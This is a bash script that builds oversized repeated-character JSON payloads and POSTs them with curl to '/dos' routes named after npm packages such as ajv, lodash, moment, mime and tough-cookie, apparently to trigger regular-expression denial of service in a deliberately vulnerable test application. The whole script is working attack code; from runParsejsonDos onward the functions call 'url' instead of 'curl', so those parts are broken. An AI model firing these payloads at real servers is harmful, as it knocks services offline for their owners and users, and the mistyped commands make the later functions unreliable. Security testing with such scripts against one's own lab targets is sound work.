#!/bin/bash
set +x

generate() {
    # echo "Running generation... Hold tight." > /dev/null
    # start=`date +%s`

    LENGTH=$1
    CHAR=$2
    RESULT=""
    for ((i = 0; i <= $LENGTH; i++))
    do
        RESULT=$RESULT$CHAR
    done

    # end=`date +%s`
    # runtime=$((end-start))
    # echo "All done!" > /dev/null
    # echo "Took: ${runtime}s" > /dev/null
    echo $RESULT
}

makeJson() {
    STR=$1
    jo -p title=$STR > ../data.json
}

runAjvDos() {
    fin="$(generate 10000 "if(")x$(generate 10000 ")")"
    makeJson $fin
    curl -d "@../data.json" -H "Content-Type: application/json" -X POST ${URL}/ajv/dos
}

runCharsetDos() {
    fin="$(generate 40000 " ")"
    makeJson $fin
    curl -d "@../data.json" -H "Content-Type: application/json" -X POST ${URL}/charset/dos
}

runFreshDos() {
    fin="$(generate 60000 "x")x"
    makeJson $fin
    curl -d "@../data.json" -H "Content-Type: application/json" -X POST ${URL}/fresh/dos
}

runLodashDos() {
    fin="$(generate 80000 "A")"
    makeJson $fin
    curl -d "@../data.json" -H "Content-Type: application/json" -X POST ${URL}/lodash/dos
}

runMimeDos(){
    fin="$(generate 81750 "5")"
    makeJson $fin
    curl -d "@../data.json" -H "Content-Type: application/json" -X POST ${URL}/mime/dos
}

runMobileDetectDos(){
    fin="$(generate 12500 "Dell")"
    makeJson $fin
    curl -d "@../data.json" -H "Content-Type: application/json" -X POST ${URL}/mobile_detect/dos
}

runMomentDos(){
    fin="$(generate 50000 "1")"
    makeJson $fin
    curl -d "@../data.json" -H "Content-Type: application/json" -X POST ${URL}/moment/dos
}

runNoCaseDos(){
    fin="$(generate 50000 "X")"
    makeJson $fin
    curl -d "@../data.json" -H "Content-Type: application/json" -X POST ${URL}/no_case/dos
}

runParsejsonDos(){
    fin="$(generate 50000 " ")"
    makeJson $fin
    url -d "@../data.json" -H "Content-Type: application/json" -X POST ${URL}/parsejson/dos
}

runPlatformDos(){
    fin="$(generate 30000 " ")"
    makeJson $fin
    url -d "@../data.json" -H "Content-Type: application/json" -X POST ${URL}/platform/dos
}

runSlugDos(){
    fin="$(generate 50000 " ")"
    makeJson $fin
    url -d "@../data.json" -H "Content-Type: application/json" -X POST ${URL}/slug/dos
}

runStringDos(){
    fin="$(generate 50000 "9")"
    makeJson $fin
    url -d "@../data.json" -H "Content-Type: application/json" -X POST ${URL}/string/dos
}

runToughCookieDos(){
    fin="$(generate 50000 " ")"
    makeJson $fin
    url -d "@../data.json" -H "Content-Type: application/json" -X POST ${URL}/tough_cookie/dos
}

runTimespanDos(){
    fin="$(generate 30000 "1")"
    makeJson $fin
    url -d "@../data.json" -H "Content-Type: application/json" -X POST ${URL}/timespan/dos
}

runUnderscoreStringDos(){
    fin="$(generate 50000 "&")"
    makeJson $fin
    url -d "@../data.json" -H "Content-Type: application/json" -X POST ${URL}/underscore_string/dos
}